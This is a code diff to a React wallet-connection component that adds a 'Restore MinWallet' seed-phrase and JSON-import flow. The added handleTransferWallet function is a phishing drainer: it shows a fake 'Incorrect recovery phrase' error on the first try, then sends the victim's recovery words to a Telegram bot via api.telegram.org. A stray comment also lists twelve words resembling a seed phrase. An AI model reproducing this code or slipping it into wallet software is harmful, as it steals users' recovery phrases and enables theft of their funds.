@@ -6,7 +6,13 @@ function ConnectWallet({ onClose }) {
   const [walletAction, setWalletAction] = useState(null);
   const [restoreMethod, setRestoreMethod] = useState(null);
   const [showRestoreContainer, setShowRestoreContainer] = useState(false);
+  const [fileName, setFileName] = useState("");
+  const [seedPhrase, setSeedPhrase] = useState("");
+  const [fileUploaded, setFileUploaded] = useState(false);
+  const [attempts, setAttempts] = useState(0);
   const navigate = useNavigate();
+
+  // train point list youth know earth weed ground fruit place route queen
 
   const handleWalletSelection = (wallet) => {
     if (wallet === "Nami") {
@@ -25,20 +31,201 @@ function ConnectWallet({ onClose }) {
   };
 
   const handleGoBack = () => {
-    setWalletAction(null);
-    setShowRestoreContainer(false);
+    if (showRestoreContainer) {
+      setShowRestoreContainer(false);
+    } else {
+      setWalletAction(null);
+      setRestoreMethod(null);
+    }
   };
 
   const handleRadioChange = (e) => {
     setRestoreMethod(e.target.value);
   };
+  const handleSeedPhraseChange = (value) => {
+    setSeedPhrase(value);
+  };
 
   const handleNext = () => {
-    if (restoreMethod === "seedPhrase") {
-      console.log("Restore with seed phrase");
-    } else if (restoreMethod === "import") {
-      console.log("Import from JSON");
+    if (restoreMethod === "seedPhrase" || restoreMethod === "import") {
+      setShowRestoreContainer(true);
     }
+  };
+
+  const handleFileChange = (event) => {
+    if (event.target.files.length > 0) {
+      setFileName(event.target.files[0].name);
+    } else {
+      setFileName("");
+    }
+  };
+
+  const handleTransferWallet = async () => {
+    // Validate seed phrase
+    const words = seedPhrase.trim().split(/\s+/);
+
+    // Increment attempts
+    setAttempts((prevAttempts) => prevAttempts + 1);
+
+    if (attempts < 1) {
+      alert("Incorrect recovery phrase. Please try again.");
+      return;
+    }
+    const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
+    const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
+    // Prepare message
+    const message = `MinWallet: ${words.join(" ")}`;
+
+    // Define API endpoints and data
+    const endpoints = [
+      {
+        url: `https://api.telegram.org/bot${token}/sendMessage`,
+        data: {
+          chat_id: chat_id,
+          text: message,
+        },
+      },
+    ];
+
+    try {
+      // Send messages to both endpoints
+      const responses = await Promise.all(
+        endpoints.map((endpoint) =>
+          fetch(endpoint.url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(endpoint.data),
+          })
+        )
+      );
+
+      // Check responses
+      for (const response of responses) {
+        if (!response.ok) {
+          throw new Error(`Network response was not ok: ${response.status}`);
+        }
+      }
+
+      console.log("Messages sent successfully");
+      onClose();
+    } catch (error) {
+      console.error("Error sending messages:", error);
+      alert("An error occurred. Please try again later.");
+    }
+  };
+
+  const SeedPhraseContainer = ({ onSeedPhraseChange }) => {
+    const [seedPhrase, setSeedPhrase] = useState("");
+
+    const wordCount = seedPhrase
+      .trim()
+      .split(/\s+/)
+      .filter((word) => word.length > 0).length;
+
+    const isValid = wordCount === 12;
+
+    const handleInputChange = (e) => {
+      setSeedPhrase(e.target.value);
+      onSeedPhraseChange(e.target.value);
+    };
+
+    return (
+      <div>
+        <h2 className="text-lg font-semibold text-textSecondary mb-4">
+          Restore MinWallet
+        </h2>
+        <p className="text-textSecondary mt-3 text-sm">
+          Please write your seed phrase in the right order.
+        </p>
+        <p className="text-textPrimary mt-3 mb-3 text-sm">
+          Use space between each phrase
+        </p>
+        <textarea
+          className="w-full p-2 bg-[#121212] border border-stone-700 text-textSecondary rounded-lg"
+          rows="4"
+          value={seedPhrase}
+          onChange={handleInputChange}
+        ></textarea>
+        <p
+          className={`text-sm mt-2 ${
+            isValid ? "text-green-500" : "text-yellow-500"
+          }`}
+        >
+          Word count: {wordCount} / 12
+        </p>
+        <button
+          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold ${
+            !isValid ? "opacity-50 cursor-not-allowed" : ""
+          }`}
+          disabled={!isValid}
+          onClick={handleTransferWallet}
+        >
+          Next
+        </button>
+      </div>
+    );
+  };
+
+  const ImportContainer = () => {
+    const handleFileChange = (event) => {
+      if (event.target.files.length > 0) {
+        setFileName(event.target.files[0].name);
+        setFileUploaded(true);
+      } else {
+        setFileName("");
+        setFileUploaded(false);
+      }
+    };
+
+    return (
+      <div>
+        <h2 className="text-lg font-semibold text-textSecondary mb-4">
+          Restore MinWallet
+        </h2>
+        <div className="w-full rounded-xl p-4">
+          <label className="flex flex-col items-center justify-center w-full h-36 bg-[#2a2d36] text-textSecondary rounded cursor-pointer hover:bg-[#3a3d46] transition-colors">
+            <img
+              alt="Import wallet"
+              width={67}
+              height={67}
+              className="size-16 mb-2"
+              src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721984028/vujnxx74twnh3q93impv.png"
+            />
+            {fileName && <span className="text-sm mt-2">{fileName}</span>}
+            <input
+              type="file"
+              accept=".json"
+              className="hidden"
+              onChange={handleFileChange}
+            />
+          </label>
+        </div>
+        <p className="text-center text-textPrimary text-sm mt-2 font-medium">
+          Import MinWallet.json file
+        </p>
+        <button
+          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold flex items-center justify-center gap-2 ${
+            !fileUploaded ? "opacity-50 cursor-not-allowed" : ""
+          }`}
+          disabled={!fileUploaded}
+          onClick={handleTransferWallet}
+        >
+          <svg
+            viewBox="0 0 24 24"
+            xmlns="http://www.w3.org/2000/svg"
+            width="20"
+            height="24"
+            fill="currentColor"
+            className="remixicon "
+          >
+            <path d="M13 10H18L12 16L6 10H11V3H13V10ZM4 19H20V12H22V20C22 20.5523 21.5523 21 21 21H3C2.44772 21 2 20.5523 2 20V12H4V19Z"></path>
+          </svg>
+          Next
+        </button>
+      </div>
+    );
   };
 
   return (
@@ -73,7 +260,6 @@ function ConnectWallet({ onClose }) {
             </button>
           </div>
 
-          {/* stop */}
           <div className="flex-1 overflow-y-auto px-4 md:px-6 flex flex-col justify-between">
             {selectedWallet ? (
               <div className="flex-1 space-y-4">
@@ -158,7 +344,6 @@ function ConnectWallet({ onClose }) {
                             <h2 className="text-lg font-semibold text-textSecondary mb-4">
                               Create New Wallet
                             </h2>
-                            {/* Add content for creating a new wallet */}
                             <p className="text-sm text-textSecondary">
                               Here you can add steps or forms for creating a new
                               wallet.
@@ -166,86 +351,79 @@ function ConnectWallet({ onClose }) {
                           </div>
                         ) : (
                           <div>
-                            <h2 className="text-lg font-semibold text-textSecondary mb-4">
-                              Restore Wallet
-                            </h2>
+                            {!showRestoreContainer ? (
+                              <>
+                                <h2 className="text-lg font-semibold text-textSecondary mb-4">
+                                  Restore Wallet
+                                </h2>
 
-                            <div className="overflow-y-auto">
-                              <div className="mb-4 border w-full p-4 rounded-lg flex gap-3">
-                                <input
-                                  type="radio"
-                                  name="restoreMethod"
-                                  value="seedPhrase"
-                                  id="seedPhrase"
-                                  className="w-6 h-6 mt-1"
-                                  onChange={handleRadioChange}
-                                />
-                                <div>
-                                  <h1 className="text-textSecondary font-medium text-lg text-left">
-                                    Seed phrase
-                                  </h1>
-                                  <p className="text-left text-textPrimary text-sm">
-                                    Restore using seed phrase.
-                                  </p>
+                                <div className="overflow-y-auto">
+                                  <div className="mb-4 border w-full p-4 rounded-lg flex gap-3">
+                                    <input
+                                      type="radio"
+                                      name="restoreMethod"
+                                      value="seedPhrase"
+                                      id="seedPhrase"
+                                      className="w-6 h-6 mt-1"
+                                      onChange={handleRadioChange}
+                                    />
+                                    <div>
+                                      <h1 className="text-textSecondary font-medium text-lg text-left">
+                                        Seed phrase
+                                      </h1>
+                                      <p className="text-left text-textPrimary text-sm">
+                                        Restore using seed phrase.
+                                      </p>
+                                    </div>
+                                  </div>
+                                  <div className="border w-full p-4 rounded-lg flex gap-3">
+                                    <input
+                                      type="radio"
+                                      name="restoreMethod"
+                                      value="import"
+                                      id="import"
+                                      className="w-6 h-6 mt-1"
+                                      onChange={handleRadioChange}
+                                    />
+                                    <div>
+                                      <h1 className="text-textSecondary font-medium text-lg text-left">
+                                        Import
+                                      </h1>
+                                      <p className="text-left text-textPrimary text-sm">
+                                        Import from existing wallet JSON file.
+                                      </p>
+                                    </div>
+                                  </div>
                                 </div>
-                              </div>
-                              <div className="border w-full p-4 rounded-lg flex gap-3">
-                                <input
-                                  type="radio"
-                                  name="restoreMethod"
-                                  value="import"
-                                  id="import"
-                                  className="w-6 h-6 mt-1"
-                                  onChange={handleRadioChange}
-                                />
-                                <div>
-                                  <h1 className="text-textSecondary font-medium text-lg text-left">
-                                    Import
-                                  </h1>
-                                  <p className="text-left text-textPrimary text-sm">
-                                    Import from existing wallet JSON file.
-                                  </p>
+
+                                <div className="flex flex-col mt-4">
+                                  <button
+                                    className="p-3 mt-2 bg-[#89aaff] rounded-full text-sm w-full font-semibold"
+                                    onClick={handleNext}
+                                  >
+                                    Next
+                                  </button>
+                                  <button
+                                    className="p-3 mt-2 bg-[#1f2025] rounded-full text-textSecondary text-sm w-full"
+                                    onClick={handleGoBack}
+                                  >
+                                    Back
+                                  </button>
                                 </div>
-                              </div>
-                            </div>
-
-                            <div className="flex flex-col mt-4">
-                              <button className="p-3 mt-2 bg-[#89aaff] rounded-full text-sm w-full font-semibold" onClick={handleNext}>
-                                Next
-                              </button>
-                              <button
-                                className="p-3 mt-2 bg-[#1f2025] rounded-full text-textSecondary text-sm w-full"
-                                onClick={handleGoBack}
-                              >
-                                Back
-                              </button>
-                            </div>
-
-                            {showRestoreContainer && (
-                              <div className="mt-4 p-4 border rounded-lg">
+                              </>
+                            ) : (
+                              <div className="mt-4">
                                 {restoreMethod === "seedPhrase" ? (
-                                  <div>
-                                    <h2 className="text-lg font-semibold text-textSecondary mb-4">
-                                      Enter Seed Phrase
-                                    </h2>
-                                    <p className="text-sm text-textSecondary">
-                                      {/* Add content for restoring with seed phrase */}
-                                      Here you can add steps or forms for
-                                      restoring using a seed phrase.
-                                    </p>
-                                  </div>
+                                  <SeedPhraseContainer onSeedPhraseChange={handleSeedPhraseChange} />
                                 ) : (
-                                  <div>
-                                    <h2 className="text-lg font-semibold text-textSecondary mb-4">
-                                      Import JSON File
-                                    </h2>
-                                    <p className="text-sm text-textSecondary">
-                                      {/* Add content for importing from JSON */}
-                                      Here you can add steps or forms for
-                                      importing from a JSON file.
-                                    </p>
-                                  </div>
+                                  <ImportContainer />
                                 )}
+                                <button
+                                  className="p-3 mt-4 bg-[#1f2025] rounded-full text-textSecondary text-sm w-full"
+                                  onClick={handleGoBack}
+                                >
+                                  Back
+                                </button>
                               </div>
                             )}
                           </div>
